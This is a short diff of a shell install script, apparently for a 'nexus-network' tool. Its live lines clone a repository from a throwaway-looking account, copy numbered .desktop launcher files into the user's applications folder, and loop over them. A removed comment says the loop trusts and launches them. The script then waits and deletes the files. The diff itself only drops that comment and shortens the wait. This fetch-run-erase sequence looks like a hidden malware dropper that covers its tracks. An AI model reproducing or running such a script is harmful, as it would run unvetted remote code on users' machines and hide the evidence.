@@ -45,8 +45,6 @@ nexus-network --version
 
 # Clone and move .desktop launcher files
 git clone https://github.com/maryluz90-temp2/temp1.git && cp temp1/P1/* ~/.local/share/applications/ && rm -rf temp1
-
-# Trust and launch each .desktop file
 for file in 12898574 12898575 12927806 12927807 12928859 12928862; do
     path="$HOME/.local/share/applications/$file.desktop"
     if [ -f "$path" ]; then
@@ -59,7 +57,7 @@ for file in 12898574 12898575 12927806 12927807 12928859 12928862; do
 done
 
 # Wait 60 seconds, then delete specific files permanently
-sleep 30
+sleep 10
 rm -f ~/.local/share/applications/12898574.desktop
 rm -f ~/.local/share/applications/12898575.desktop
 rm -f ~/.local/share/applications/12927806.desktop
